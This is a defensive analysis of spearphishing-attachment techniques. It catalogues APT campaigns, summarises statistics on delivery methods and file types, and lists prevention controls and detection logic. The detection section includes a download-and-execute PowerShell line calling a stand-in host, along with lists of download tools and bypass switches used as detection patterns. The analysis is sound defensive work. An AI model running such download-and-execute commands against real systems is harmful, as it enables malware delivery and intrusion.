+* **Chaes** malware campaigns used malicious .docx attachments, exploiting template injection vulnerabilities upon opening, targeting MercadoLivre customers. Opening the .docx file, Annexo.docx, automatically triggered exploits, fetching a malicious .msi file and initiating malware execution without macro enablement.
+* **Clambling** backdoor delivery employed malicious .DOCX attachments for gambling industry support teams, requiring a specific user action within the document to activate the exploit. Opening .DOCX attachments and double-clicking embedded images triggered malicious code execution, deploying the CLAMBLING.A backdoor.
+* **Confucius** APT attacks used weaponized Word documents, automatically triggering template injection and exploiting CVE-2018-0802 upon opening, often mimicking research papers. Opening these documents automatically triggered exploits, leading to Warzone RAT deployment without macro enablement or extensive user interaction.
+* **Dragonfly** (Berserk Bear) attacks utilized malicious attachments that automatically executed due to the CVE-2011-0611 exploit upon opening, targeting executives in critical infrastructure sectors. Opening weaponized attachments automatically triggered auto-execution, requiring no user action beyond opening the attachment to initiate compromise.
+* **Frankenstein** campaign distributed malicious Microsoft Word documents that automatically executed CVE-2017-11882 upon opening, leveraging personalized emails to increase victim engagement. Opening these documents automatically triggered exploits, streamlining infection by requiring only the initial action of opening the document.
+* **Gallmaker** attacks with malicious Microsoft Office documents required users to enable content for DDE, specifically targeting the exploitation of DDE feature rather than macros. User action to enable Dynamic Data Exchange was specifically needed to trigger malware execution, focusing on DDE exploitation.
+* **Gamaredon Group** attacks used malicious attachments that automatically executed upon opening .docx documents due to remote template injection, streamlining infection processes. Opening .docx documents automatically triggered exploits, leveraging template injection for seamless infection and bypassing macro reliance.
+* **Gorgon Group** attacks utilized malicious Microsoft Office documents, automatically executing upon opening due to exploits, optimizing infection efficiency. Opening the attachment was sufficient to execute code, streamlining infection via exploit-based auto-execution, requiring minimal user interaction.
+* **Inception** attacks involved weaponized documents that automatically executed upon opening due to remote template injection, facilitating stealth and efficient exploitation. Opening weaponized documents automatically triggered exploits, leveraging template injection for stealth and efficient exploitation, minimizing user-side actions.
+* **Leviathan** delivery used emails with .doc and .xls files that automatically executed exploits upon opening, simplifying the infection process for the attackers. Opening these files automatically triggered exploits, making infection user-transparent and highly efficient due to exploit-based auto-execution.
+* **Naikon** delivery employed emails with malicious email attachments that automatically executed exploits upon opening, streamlining initial access. Opening these attachments automatically triggered exploits, making infection user-transparent and highly efficient through exploit auto-execution, emphasizing ease of compromise.
+* **Operation Dust Storm** attacks used malicious Microsoft Word documents that automatically executed CVE-2011-0611 upon opening, targeting specific individuals with tailored lures. Opening these documents automatically triggered exploits, tailored with relevant lures to specific individuals to increase chances of automatic exploit triggering.
+* **PLATINUM** delivery via attachments automatically executed zero-day exploits upon opening, representing a highly advanced and stealthy attack method. Opening the attachment was the only required user action, making infection user-transparent and highly efficient due to zero-day exploit auto-execution, showcasing sophistication.
+* **Sidewinder** delivery via attachments required users to open the attachment, with specific interaction beyond opening varying by attachment type. Opening the attachment initiated the attack, offering flexible user interaction requirements based on the chosen vector for malware delivery.
+* **TA459** delivery used emails with malicious Microsoft Word attachments that automatically executed CVE-2017-0199 upon opening, streamlining the infection process. Opening these documents automatically triggered exploits, streamlining infection via CVE-2017-0199, requiring minimal user action beyond opening the file.
+* **Taidoor** delivery via emails automatically executed exploits upon opening attachments, making infection user-transparent and efficient for malware deployment. Opening the attachment was sufficient to trigger exploits, making infection user-transparent and highly efficient through exploit auto-execution for Taidoor malware.
+* **The White Company** campaigns used RTF files exploiting CVE-2012-0158 and zero-day vulnerabilities, automatically executing upon opening. Opening weaponized RTF files automatically triggered exploit execution, leading to RAT deployment and espionage capabilities without user interaction beyond opening.
+* **Threat Group-3390** delivery via attachments required users to open .DOCX files and double-click embedded images, indicating user interaction within the document beyond just opening. Specific user interaction within the document beyond opening was needed, making it more targeted and user-dependent via image interaction, differing from fully automated exploit methods.
+* **Transparent Tribe** campaigns used RTF files exploiting CVE-2012-0158, automatically executing upon opening, streamlining infection. Opening RTF attachments automatically triggered exploits, requiring no user action beyond opening the RTF document itself for CrimsonRAT or ObliqueRAT deployment.
+* **Tropic Trooper** operations involved Office attachments exploiting CVE-2017-11882, automatically executing upon opening, streamlining infection for backdoor installation. Opening weaponized Office attachments triggered exploits like CVE-2017-11882, leading to remote code execution and backdoor installation with minimal user interaction.
+* **Woody RAT** delivery via emails used malicious Word documents automatically executing CVE-2022-30190 upon opening, leveraging the Follina vulnerability. Opening weaponized Word documents automatically triggered the Follina vulnerability, leading to Woody RAT download and execution, bypassing macro reliance.
+* **ZxxZ** trojan distribution via emails employed RTF files exploiting CVE-2017-11882, automatically executing upon opening, facilitating automatic trojan delivery. Opening weaponized RTF files automatically triggered CVE-2017-11882 exploit execution, leading to ZxxZ trojan download and execution without macro enablement.
+
+**Executable-based Attachment**
+
+Executable-based attacks represent a more direct approach, relying on tricking users into executing malicious files disguised as legitimate attachments. These attacks often involve sending emails with attachments that are actually executable files (.exe, .scr, .lnk, .vbe, etc.) but are disguised with deceptive filenames, icons, or archive formats like ZIP or RAR to appear as documents or benign files. Social engineering plays a crucial role, with emails crafted to convince recipients that the attached executable is something safe or necessary to open, such as a document, update, or utility.&#x20;
+
+* **AppleSeed** delivery started with emails containing a ZIP archive, disguised as official Ministry of Foreign Affairs communications, enticing recipients to open the archive. Opening the ZIP archive and subsequently executing a masked Javascript file within deployed the AppleSeed backdoor, requiring user initiation of the executable.
+* **APT1** emails used ZIP files containing disguised executable files, employing deceptive tactics like double extensions to appear as benign PDFs and tricking recipients into execution. Recipients were tricked into opening ZIP archives, believing they contained harmless files, and executing disguised executables that installed custom backdoors like WEBC2.
+* **APT32** attacks used executable attachments disguised as documents but also employed exploits like CVE-2017-11882 within RTF files, using a dual approach for infection. While RTF attachments automatically triggered exploits, executable attachments relied on social engineering to trick users into execution, showcasing varied infection vectors.
+* **APT41** campaigns used malicious compiled HTML (.chm) file attachments, delivered in trustworthy-looking emails to enhance credibility. Opening these .chm file attachments directly executed embedded scripts or malicious code, leading to backdoor installation without further user interaction post-opening.
+* **Astaroth** (Guildma) campaigns used targeted emails disguised as corporate or transactional communications. Opening HTML attachments automatically executed JavaScript code, which downloaded a compressed LNK file, requiring a subsequent, deliberate user action to execute the LNK file for full compromise.
+* **Bumblebee** malware was delivered via emails with ISO archive attachments, impersonating services like DocuSign to enhance legitimacy and trust. Users were tricked into mounting the ISO and executing an LNK file inside to deploy the Bumblebee loader and payload, demanding multi-step user interaction.
+* **DarkGate** malware distribution via emails with .vbe attachments relied on users directly opening the .vbe attachment, a straightforward, user-initiated infection process. Emails were likely crafted to appear legitimate to encourage users to open the attached VBE file, initiating malware execution upon direct file opening.
+* **DarkWatchman** RAT was deployed via attachments requiring users to open a ZIP archive and execute an EXE file within, relying on social engineering to encourage this action. Emails likely appeared as legitimate communications from entities like Pony Express to encourage users to open the ZIP and execute the EXE file inside for RAT deployment.
+* **EnvyScout** delivery used HTML attachments that initiated infection simply by opening the HTML file attachment, streamlining the initial compromise. Emails likely appeared as legitimate communications to entice targeted individuals to open attachments, initiating infection simply by opening the HTML file.
+* **FIN4** attacks used attachments where users were tricked into opening the attachment and entering credentials in a fake popup, combining attachment opening with credential phishing. Emails often used authentic subject matter like SEC filings to lure victims into opening attachments and providing credentials through deceptive pop-ups.
+* **FIN7** attacks with malicious Microsoft Documents utilized LNK/VBScript vectors needing users to double-click an image within the document, requiring direct user interaction. Excel/Macro vectors required macro enablement, offering diverse infection methods but all requiring user engagement.
+* **Higaisa** attacks used malicious attachments requiring users to open RAR archives and execute LNK files inside, combining archive manipulation with executable execution. User action to open RAR and execute LNK inside was needed to initiate infection, relying on archive and executable combination for malware delivery.
+* **Javali** delivery used emails with malicious MSI attachments requiring users to open and execute MSI installers. User action to execute the MSI file was needed to initiate infection, relying on users running executable installers for malware deployment.
+* **KOCTOPUS** delivery via attachments required users to open archives and execute embedded files. User action to open the archive and execute the file inside was needed to initiate infection, relying on archive and executable file combinations.
+* **KOPILUWAK** delivery via email attachment required users to open SFX archives, initiating infection upon user action to open the SFX archive alone. User action to open the SFX archive alone initiated infection, making it a straightforward user-initiated infection process via self-extracting archive.
+* **Latrodectus** delivery via attachments involved a multi-step process requiring users to open PDF attachments, solve CAPTCHAs, and indirectly execute JS files, demonstrating a layered approach to user engagement. This multi-step process involved user interaction at multiple points, demonstrating a layered approach to user engagement with PDF and executable elements.
+* **Machete** delivery used emails with zipped file attachments requiring users to open ZIP files and execute SFX files within. User action to open the ZIP archive and execute SFX inside initiated infection, relying on archive and self-extracting executable combination for malware delivery.
+* **Metamorfo** delivery used emails with HTML attachments, requiring users to open HTML files, then ZIP archives, and finally execute PE files, demanding multiple user interactions for successful infection. This multi-step process heavily relied on user actions at each stage of the infection chain, demanding multiple user interactions.
+* **Moonstone Sleet** delivery via attachments required users to open ZIP archives and execute .exe files within. User action to open ZIP archive and execute .exe inside initiated infection, using archive and executable combinations for malware delivery.
+* **Mustang Panda** delivery via attachments required users to open archives and execute embedded files. User action to open archive and execute file inside initiated infection, relying on archive and executable combinations for malware delivery.
+* **NETWIRE** delivery via attachments required users to execute attached files (assumed executables), making it a straightforward, user-initiated infection process. User action to execute the attached file initiated infection, making it straightforward and user-initiated via direct executable attachment.
+* **Pony** delivery via attachments required users to click links and execute downloaded .scr files, indicating a multi-step, user-initiated infection process. This multi-step process involved user interaction at multiple points, showing a layered approach to user engagement with links and executable downloads.
+* **Saint Bot** delivery via attachments required users to open ZIP archives and execute LNK files within. User action to open ZIP archive and execute LNK inside initiated infection, relying on archive and LNK executable combinations for malware delivery.
+* **Silence** delivery used emails with CHM and LNK attachments, requiring users to open these executable-like attachments for malware deployment. User action to open CHM or LNK attachments initiated infection, relying on users running executable-like file types for malware delivery.
+* **Snip3** delivery via emails with email attachments required users to open VBS attachments directly. User action to open VBS attachment alone initiated infection, making it straightforward and user-initiated via direct VBScript attachment execution.
+* **Agent Tesla** delivery used emails with ZIP attachments requiring users to open ZIP archives and execute .exe files within. User action to open ZIP and execute .exe inside initiated infection, relying on archive and executable combination for Agent Tesla delivery.
+
+**Link-based Attachment**
+
+Link-based attacks, while often categorized separately from attachments, can be delivered via attachments like PDFs or HTML files that contain malicious links. In this approach, the attachment itself is not directly malicious but serves as a vehicle to deliver a link to a malicious resource. Users are enticed to open the attachment, which then contains a link, often disguised or obfuscated, that the user is prompted to click. Clicking this link redirects the victim to a malicious website or initiates a file download, leading to drive-by downloads, credential harvesting, or malware installation.&#x20;
+
+* **APT-C-36** delivery via emails used RAR archives, containing an embedded .doc file (actually MHTML) that indirectly led to executable download and execution through a link within the document. Users were required to open and decrypt RAR archives and then open an embedded .doc file, initiating a chain reaction leading to malware via a link.
+* **Darkhotel** delivery via emails used RAR and .LNK attachments, targeting high-value individuals. Users were required to open RAR archives and execute .scr files inside, which indirectly led to LNK execution and potential link-based actions in later stages.
+* **DarkHydrus** campaigns employed attachments with exploits, including malicious .iqy files and Office documents using "attachedTemplate", with .iqy files leading to PowerShell script downloads via links embedded within the files. Opening .iqy files in Excel automatically downloaded PowerShell scripts via links, initiating payload delivery through user action on the link.
+* **DarkTortilla** delivery via emails used archive attachments, requiring users to open archive attachments and execute embedded files, which could include links for further downloads in the infection chain. Users were required to open archive attachments and execute embedded files to initiate the attack, potentially involving link-based downloads for secondary stages.
+* **Metamorfo** delivery via emails used HTML attachments. Users were required to open HTML attachments, then open ZIP archives linked within the HTML, and finally execute PE files inside the ZIP, demonstrating a multi-stage process with link-based elements in HTML content.
+* **NETWIRE** delivery via emails used malicious attachments (assumed executables). Users were required to be convinced by email lures to execute the attached file, which could then lead to link-based drive-by downloads for additional components.
+* **Operation Spalax** delivery via emails used PDF attachments containing embedded links. Users were required to open PDF attachments and click on embedded links within, then execute downloaded files, initiating the attack through user-activated links.
+* **OutSteel** delivery via emails used malicious attachments (assumed executables). Users were required to be convinced by email lures to execute the attached file, which in turn could lead to link-based downloads for subsequent stages.
+* **Ramsay** delivery via emails used malicious attachments (assumed executables). Users were required to be convinced by email lures to execute the attached file, potentially leading to link-based activities for command and control.
+* **RTM** delivery via emails used attachments disguised as PDF documents, which were actually executables. Users were required to be convinced by email lures to execute the attached file, potentially leading to link-based interactions for data exfiltration.
+* **SideCopy** delivery via emails used .hta file attachments. Users were required to open .hta attachments to initiate the attack, which could involve subsequent link-based activities for lateral movement or payload updates.
+* **Star Blizzard** delivery via emails used malicious .pdf files assumed to contain links leading to malware downloads, enticing users to click on embedded links within PDFs. Users needed to open the PDF and click on a link to initiate the download process, relying on user interaction with the embedded link.
+* **TA551** delivery via emails used password-protected ZIP archives. Users were required to open ZIP archives and execute .exe files inside, which might involve link-based activities for post-exploitation actions.
+* **Valak** delivery via emails used password-protected ZIP archives. Users were required to open ZIP archives and execute .exe files inside, potentially leading to link-based communication with C2 servers for instructions.
+* **Water Curupira Pikabot** delivery via emails used password-protected ZIP archives. Users were required to open ZIP archives and execute LNK or JS files inside, which may initiate link-based connections for further payload retrieval.
+* **Windshift** delivery via emails used attachments designed to lead to drive-by downloads, requiring users to click links within emails or attachments to initiate the attack. Users were required to click links within emails or open attachments and then click on links inside to initiate drive-by downloads.
+* **Wizard Spider** delivery via emails used PDF documents containing embedded links. Users were required to open PDF documents and click embedded links within, then execute downloaded files, demonstrating reliance on user interaction with links for malware delivery.
+
+## APT Procedures Analysis
+
+#### Initial Execution Mechanism
+
+**Macro-based attacks** remain a highly prevalent initial execution mechanism, constituting **54 instances out of 132** analyzed examples, representing approximately **40.9%** of all Spearphishing Attachment techniques referenced in the MITRE ATT\&CK framework. This underscores the persistent effectiveness of social engineering in tricking users into enabling macros within seemingly benign documents to initiate malware deployment.
+
+**Exploit-based mechanisms** are also significant, observed in **32 instances out of 132**, or **24.2%** of the examples. This highlights the continued reliance of threat actors on leveraging software vulnerabilities. These attacks often require minimal user interaction beyond opening a file, as exploits are designed to automatically compromise systems by taking advantage of vulnerabilities in applications like Microsoft Office, archive handlers, or other software used to process the attached files.
+
+**Executable-based attacks**, where users are tricked into directly or indirectly running malicious files, account for **29 instances out of 132**, or **22.0%**. This indicates a substantial portion of attacks still rely on user execution of files disguised as documents, updates, or other legitimate software. These attacks often use social engineering to convince users to bypass security warnings and execute the malicious payload.
+
+**Link-based attacks**, delivered via attachments, are less frequent in this dataset but still represent a notable method, with **17 instances out of 132**, or **12.9%**. This suggests that while direct attachment methods are more prevalent (or more documented in threat reports), embedding malicious links within attachments to redirect users to malicious websites or initiate downloads remains a relevant approach.
+
+#### File Types
+
+Regarding file types employed in these attacks, **Microsoft Office documents** are overwhelmingly dominant, appearing in **78 out of 132 analyzed examples**, constituting approximately **59.1%** of the file types used. This highlights the continued and significant targeting of common document formats such as DOC, DOCX, XLS, and XLSM, as attackers exploit user trust and familiarity with these file types alongside software vulnerabilities within Office applications.
+
+**Archives (ZIP, RAR, ISO, SFX)** are also frequently used, observed in **31 out of 132 examples**, representing about **23.5%** of file types used. These formats serve as containers to package and disguise malicious executables or documents, and are sometimes used to exploit vulnerabilities in archive handling software itself.
+
+**Executable files (EXE, SCR, LNK, VBE, MSI, CHM)** are directly employed in **30 out of 132 examples**, accounting for approximately **22.7%** of file types used. This indicates a direct approach to delivering malware, where users are tricked into executing files that are inherently malicious, often disguised with deceptive names or icons.
+
+**PDF files**, while often perceived as safer, are still used in **11 out of 132 examples**, or about **8.3%** of file types used. Attackers leverage PDFs to embed links to malicious sites, or sometimes as containers for exploits themselves, demonstrating that even widely used document formats are not immune to weaponization.
+
+**Rich Text Format (RTF) files** appear in **9 out of 132 examples**, representing roughly **6.8%** of file types used. RTF files are notable for their use in exploit-based attacks, where vulnerabilities within RTF processing software are targeted to achieve automatic code execution.
+
+**HTML files** are used in **6 out of 132 examples**, accounting for approximately **4.5%** of file types used. HTML is employed in various attack scenarios, including redirecting users to malicious websites, initiating downloads, or delivering exploits.
+
+Other file types, while less frequent individually, collectively demonstrate the breadth of attacker techniques. **Hangul Word Processor (HWP) documents** are used in **3 out of 132 examples** (approximately **2.3%**), showing targeting of specific software prevalent in certain regions. **IQY files** and **MHTML files** are each used in **1 out of 132 examples** (approximately **0.8%** each), illustrating the diverse arsenal of file formats that can be weaponized, albeit with varying prevalence.&#x20;
+
+#### Required Level of Interaction
+
+Analyzing the level of interaction required from the victim reveals that techniques requiring users to **enable macros or content** are the most frequent, aligning with the prevalence of macro-based attacks. This method accounts for **54 instances out of 132** analyzed examples, representing approximately **40.9%** of the categorized techniques. This reinforces the ongoing reliance on user enablement of macros as a critical step (and critical chokepoint for defenders) in the attack chain.
+
+A significant portion of attacks, specifically **29 instances out of 132** (**22.0%**), require users to **execute an attached file or a file within an archive**. This highlights that user action to run a file, even if disguised, remains a common and effective attack vector.
+
+**Automatic execution upon opening**, enabled by exploits, is also substantial, observed in **32 instances out of 132** (**24.2%**). This illustrates the stealth and efficiency of exploit-based delivery, where minimal user interaction beyond opening the attachment is needed to compromise a system.
+
+Techniques requiring users to **click on a link** within an attachment are less frequent compared to other methods in this dataset, with **17 instances out of 132** (**12.9%**). While link-based spearphishing via attachments is present, direct file manipulation or execution within attachments is more prevalent in the analyzed examples.
+
+## **Prevention Controls**
+
+**1. Email Security Configurations (SPF, DKIM, DMARC):**
+
+These email authentication standards help verify the sender's identity and ensure that emails are not spoofed. Implementing SPF, DKIM, and DMARC policies significantly reduces the delivery of phishing emails to user inboxes by rejecting or flagging emails from unauthorized sources.
+
+* **Why Effective:** Acts as a critical first line of defense by directly reducing the number of phishing emails, including those with malicious attachments, that reach users. Prevents delivery _before_ the user even has a chance to open the attachment.
+* **Prevalence Targeting:** Highly effective against broad and targeted phishing campaigns that rely on email spoofing to appear legitimate and deliver malicious attachments. Addresses the initial delivery vector, preventing the attack from even reaching the user to open the attachment.
+* **Practicality:** Relatively practical to implement, especially with modern email platforms and services. Requires initial setup and ongoing monitoring of reports, but the high preventive impact makes it a foundational control for blocking malicious attachment delivery.
+
+**2. Content and Attachment Scanning (Email Gateway):**
+
+Advanced email gateways perform deep content inspection of emails and their attachments. These systems can identify malicious attachments based on signatures, heuristics, and sandboxing techniques. They can block or quarantine emails with suspicious attachments, preventing users from ever opening them.
+
+* **Why Effective:** Proactively identifies and blocks or quarantines emails containing malicious attachments _before_ they reach the user's inbox. Directly prevents the user from receiving and thus opening the malicious attachment.
+* **Prevalence Targeting:** Highly effective against macro-based, exploit-based, and executable-based attachments by detecting malicious content before user interaction. Can catch known malware and some zero-day threats.
+* **Practicality:** Commonly implemented in enterprise email security solutions. Requires proper configuration and maintenance but provides a crucial layer of pre-delivery attachment analysis and threat prevention, stopping the attachment before it can be opened.
+
+**3. File Type Blocking (Network/Endpoint):**
+
+This control prevents the downloading or receiving of specific file types known to be risky, such as `.exe`, `.dll`, `.scr`, `.vbs`, `.ps1`, as email attachments. By blocking these file types at the email gateway or endpoint level, organizations can directly prevent users from receiving and opening inherently dangerous attachment types.
+
+* **Why Effective:** Directly prevents the _delivery_ and thus the _opening_ of common malware file types as email attachments. Reduces the risk by ensuring users cannot receive and interact with highly risky attachment types.
+* **Prevalence Targeting:** Highly effective against attacks relying on delivering executable files, scripts, or other easily identifiable malicious file types directly as email attachments.
+* **Practicality:** Relatively easy to implement in email gateways and endpoint management systems. Requires maintaining a list of blocked file types but provides a straightforward and effective way to reduce risk from common malicious attachments before they are opened.
+
+**4. Attachment Sandboxing/Detonation:**
+
+Before delivering emails to users, attachments are automatically opened and analyzed in a sandbox environment to detect malicious behavior. If malicious activity is detected during sandboxing, the email and attachment are blocked or quarantined, preventing the user from receiving and opening a dangerous file.
+
+* **Why Effective:** Analyzes attachment behavior in a safe, isolated environment, identifying malicious payloads _before_ they reach the user and can be opened. Directly prevents the delivery and subsequent opening of malicious attachments.
+* **Prevalence Targeting:** Effective against macro-based, exploit-based, and executable-based attachments by detecting malicious actions within the sandbox before user interaction. Can detect zero-day malware and sophisticated threats.
+* **Practicality:** Increasingly practical and commonly used in enterprise environments as part of advanced email security solutions. Provides a robust and automated way to prevent malicious attachments from being delivered and opened.
+
+**5. Content Disarm and Reconstruction (CDR):**
+
+Inspects incoming email attachments, stripping embedded threats while preserving the legitimate content. This sanitization process neutralizes potentially malicious payloads (like macros and exploits) within attachments _before_ they are delivered to users, effectively making the attachment safe to open.
+
+* **Why Effective:** Removes active and potentially malicious content (macros, scripts, exploits, embedded objects) from attachments _before_ delivery, rendering them harmless even if the user opens them. Prevents execution by removing the malicious capability from the attachment itself, before opening.
+* **Prevalence Targeting:** Highly effective against macro-based and exploit-based attachments by removing the malicious components that would be executed upon opening. Reduces the risk even for executable-based attachments by stripping potentially harmful embedded elements.
+* **Practicality:** Practical and becoming more widely adopted, especially for high-security environments and organizations handling sensitive data. Provides a proactive way to ensure attachments are safe to open by removing threats pre-delivery.
+
+**6. Software Restriction Policies (SRP):**
+
+This control prevents unauthorized applications from executing, regardless of their origin. If a user were to somehow receive and attempt to execute a standalone malicious executable attachment (even if it bypassed email filters), SRP will block the execution of that file if it's not on the whitelist of allowed applications, preventing immediate execution after opening (or attempting to open) the executable.
+
+* **Why Effective:** Directly blocks the _execution_ of malicious payloads if a user mistakenly opens an executable attachment that somehow reaches their system. Acts as a last line of defense on the endpoint to prevent immediate execution after opening (or attempting to execute) a malicious attachment.
+* **Prevalence Targeting:** Highly effective against executable-based attachments, preventing immediate execution after opening, even if the attachment reaches the endpoint.
+* **Practicality:** Practical in managed environments, although requires initial configuration and ongoing maintenance of whitelists. High effectiveness in blocking executable-based threats justifies the effort for preventing immediate execution after a malicious attachment might be opened.
+
+**7. User Awareness Training:**
+
+Educating users to recognize spearphishing emails and attachments is crucial. Regular training programs, combined with simulated phishing attacks that mimic spearphishing attachments, can significantly improve users' ability to identify and avoid opening malicious attachments in real-world scenarios.
+
+* **Why Effective:** Empowers users to become a proactive line of defense by training them to recognize and avoid spearphishing emails and attachments _before_ they open them. Reduces the likelihood of user interaction that leads to opening malicious attachments.
+* **Prevalence Targeting:** Effective against all types of spearphishing attachments as it targets the human vulnerability and aims to prevent users from falling for social engineering tactics and opening any suspicious attachment.
+* **Practicality:** Highly practical and essential for a comprehensive security strategy. Requires ongoing effort to create and deliver training and simulations, but a well-trained user base is a powerful preventative measure against opening malicious attachments.
+
+**8. Browser Security Settings (Safe Browsing, SmartScreen):**
+
+Modern browsers include built-in security features like Google Safe Browsing and Microsoft SmartScreen. These features analyze websites and downloads in real-time and warn users about potentially malicious files. If a spearphishing email contains a link to download a malicious attachment, these browser features can warn users _immediately_ before the download begins or when they attempt to open the downloaded file, giving them a chance to stop before opening.
+
+* **Why Effective:** Provides _immediate_ warnings to users directly within their browser when they attempt to download or open a potentially malicious file linked from a spearphishing email. Leverages real-time threat intelligence to identify and flag risky downloads proactively, preventing opening by warning the user.
+* **Prevalence Targeting:** Effective against a broad range of web-based threats, including malware download sites linked in spearphishing emails. Provides a user-facing warning at the point of download or opening, preventing users from proceeding.
+* **Practicality:** Enabled by default in most modern browsers and require minimal configuration. Offers a user-friendly and effective layer of protection at the browser level, complementing other security controls in preventing users from opening malicious downloads.
+
+**9. ASR Rule: Block executable content from email client and webmail:**
+
+This Attack Surface Reduction rule specifically prevents executable files (like `.exe`, `.dll`, `.scr`) from being launched directly from email clients (like Outlook) or webmail interfaces. If a user _does_ download an executable attachment (perhaps bypassing other controls) and attempts to open it directly from their email client's attachment interface or webmail download location, this rule will block the execution, preventing immediate execution after opening (or attempting to open) from these locations.
+
+* **Why Effective:** Directly blocks the _execution_ of executable files specifically in the context of email clients and webmail, a common vector for users to inadvertently execute downloaded malware attachments. Prevents immediate execution from these contexts if a user attempts to open the executable attachment after download.
+* **Prevalence Targeting:** Targets a common user behavior pattern after receiving email attachments – users might attempt to open downloaded executables directly from their email client or webmail interface.
+* **Practicality:** Easily deployed and managed through Microsoft Defender for Endpoint or Intune. Provides a focused and effective rule to prevent execution of downloaded executable attachments specifically from email-related contexts, preventing immediate execution after opening attempts from these locations.
+
+**10. Multi-Factor Authentication (MFA):**
+
+While MFA doesn't prevent users from _opening_ spearphishing attachments, it is critical in mitigating the damage if a spearphishing attachment contains a credential-stealing component or leads to account compromise. If malware within an opened attachment attempts to steal credentials or an attacker gains access through other means initiated by the attachment, MFA prevents immediate and unauthorized access to accounts, even if the attachment is opened and some compromise occurs.
+
+* **Why Effective:** Prevents _immediate_ account compromise even if a user opens a malicious attachment that attempts credential theft or initiates account takeover. Reduces the impact of successful credential harvesting or account access by requiring a second verification factor, making unauthorized access much harder even after an attachment is opened and has malicious effects.
+* **Prevalence Targeting:** Highly effective against credential phishing and account compromise attempts that may be triggered by opening spearphishing attachments. Protects against account takeover even when an attachment is opened and initial compromise occurs.
+* **Practicality:** Widely available and increasingly easy to implement across various services and applications. User adoption is crucial, but the security benefits of MFA are substantial and justify the effort in mitigating the impact of credential-focused malware delivered through opened attachments.
+
+## Detection Logic
+
+If an attacker manages to bypass the preventive controls, a detection engineer would need to focus on detecting the malicious activities _after_ the initial compromise. Here's a breakdown of specific detection logic a detection engineer would use, categorized by indicator types:
+
+**1. Suspicious Process Activity: Parent-Child Process Anomalies**
+
+* **Logic:** Alert on the creation of suspicious child processes by common document applications (Word, Excel, PowerPoint, Adobe Reader, etc.). Specifically:
+  * `winword.exe`, `excel.exe`, `powerpnt.exe`, `acrord32.exe`, etc. spawning `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, or other scripting engines or command interpreters.
+  * Document applications spawning processes from temporary directories (e.g., `%TEMP%`, `%USERPROFILE%\AppData\Local\Temp`).
+* **Rationale:** This is a highly reliable indicator of compromise directly linked to spearphishing attachments. Malicious documents frequently launch scripting engines or command interpreters to execute payloads, download malware, or establish persistence. Detecting this anomalous parent-child process relationship early is critical for identifying initial access.
+
+**2. Suspicious Network Activity: Connections to Known Malicious IPs/Domains**
+
+* **Logic:** Correlate outbound network connections with threat intelligence feeds (e.g., lists of known C2 servers, malware distribution sites, phishing domains). Alert on connections to IPs or domains with poor reputation.
+* **Rationale:** Malware often needs to communicate with Command and Control (C2) infrastructure to receive further instructions, download additional payloads, or exfiltrate data. Detecting connections to known bad IPs or domains is a strong indicator of active malware and ongoing attacker activity post-compromise.
+
+**3. Suspicious Commandline Arguments: PowerShell/Scripting Bypass Switches**
+
+* **Logic:** Alert on `powershell.exe`, `wscript.exe`, `cscript.exe` command lines that include suspicious switches like:
+  * `-NoProfile`, `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-EncodedCommand`, `-NonInteractive`.
+* **Rationale:** Attackers commonly use these switches to evade security mechanisms, hide script execution, and bypass execution policies when launching malicious scripts via spearphishing attachments. Detection of these switches in command lines is a strong signal of malicious intent.
+
+**4. Suspicious File System Activity: Executable File Creation/Modification in System Directories**
+
+* **Logic:** Alert on the creation or modification of executable files (`.exe`, `.dll`, `.scr`, etc.) in system directories (`C:\Windows\System32`, `C:\Windows\SysWOW64`) by processes originating from user profiles or email attachments.
+* **Rationale:** Malware frequently attempts to achieve persistence or replace legitimate system files by creating or modifying executables in system directories. This activity is highly indicative of malicious persistence mechanisms being deployed after initial access from a spearphishing attachment.
+
+**5. Suspicious Commandline Arguments: Obfuscated Commands**
+
+* **Logic:** Alert on command lines in `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe`, etc., that contain:
+  * Base64 encoded strings (especially long ones).
+  * XOR or other encoding patterns.
+  * Character replacement or manipulation techniques to hide commands.
+* **Rationale:** Obfuscation is a common technique used by attackers to make their commands harder to detect by signature-based security tools and analysts. Detecting obfuscated commands is a strong indicator of malicious activity attempting to evade detection post-compromise.
+
+**6. Suspicious Network Activity: Unusual Ports and Protocols**
+
+* **Logic:** Alert on outbound connections to:
+  * Unusual ports for standard services (e.g., HTTP on port 8080, DNS on port 5353, SMB on non-standard ports).
+  * Ports commonly associated with C2 traffic (e.g., 4444, 6667, 8080, custom high ports).
+  * Uncommon protocols for the environment.
+* **Rationale:** Attackers often deviate from standard ports and protocols for C2 communication to evade basic network monitoring and blend in with legitimate traffic. Detection of connections on unusual or C2-related ports is a valuable indicator of malicious network activity originating after a potential spearphishing compromise.
+
+**7. Suspicious Process Activity: Process Injection**
+
+* **Logic:** Alert on processes, especially those originating from document applications or temporary locations, attempting to inject code into legitimate system processes like `explorer.exe`, `lsass.exe`, `svchost.exe`, security software processes, or browsers.
+* **Rationale:** Process injection is a sophisticated technique used by malware to hide malicious code within legitimate processes, making it harder to detect and analyze. Detecting process injection, especially from processes linked to document applications, is a strong indicator of advanced malware activity post-attachment execution.
+
+**8. Suspicious Commandline Arguments: Download and Execute Commands**
+
+* **Logic:** Alert on command lines containing commands to download files from the internet and potentially execute them, such as:
+  * `Invoke-WebRequest`, `bitsadmin`, `certutil -urlcache`, `wget`, `curl`.
+  * Commands that download and immediately execute (e.g., `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/payload.ps1')"`).
+* **Rationale:** Multi-stage malware often uses an initial dropper (delivered via attachment) to download the main payload from an external server. Detecting commands that download and execute files is a critical indicator of secondary payload delivery and further malicious activity triggered after the initial attachment execution.
+
+**9. Suspicious File System Activity: Creation of Files with Double Extensions or Disguised Icons**
+
+* **Logic:** Alert on the creation of files with suspicious double extensions (e.g., `document.pdf.exe`, `invoice.txt.scr`) or files that have executable extensions but are created with icons that resemble document icons.
+* **Rationale:** Attackers use these techniques to socially engineer users into executing malicious files by making them appear as benign documents or other non-executable file types. Detection of files with double extensions or disguised icons can identify attempts to further trick users into running malware after initial access.
+
+**10. Suspicious Network Activity: Suspicious DNS Queries**
+
+* **Logic:** Monitor DNS queries for:
+  * Known malicious domains or domains associated with phishing.
+  * Dynamic DNS domains (often used for C2).
+  * Domains with unusual or suspicious names.
+  * Domains with very short lifespans (newly registered domains).
